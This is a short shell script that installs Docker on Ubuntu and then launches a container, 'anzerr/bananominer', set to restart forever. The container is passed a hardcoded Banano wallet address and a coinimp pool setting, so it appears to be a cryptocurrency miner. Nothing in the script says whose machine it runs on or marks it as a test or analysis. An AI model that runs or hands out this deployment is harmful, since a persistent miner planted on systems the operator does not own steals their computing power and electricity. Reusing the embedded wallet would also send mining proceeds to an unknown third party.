sudo apt update
sudo apt install apt-transport-https ca-certificates curl software-properties-common -y
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
sudo apt update
sudo apt-cache policy docker-ce
sudo apt install docker-ce -y
sudo docker run -d --restart always -e "ban_1sc97npakch5fiqxt5b4gdh3e5bdnsxz81aob7p5rho4agg7xye5kr7fjjte" -e "b=4" -e "c=coinimp" anzerr/bananominer:latest
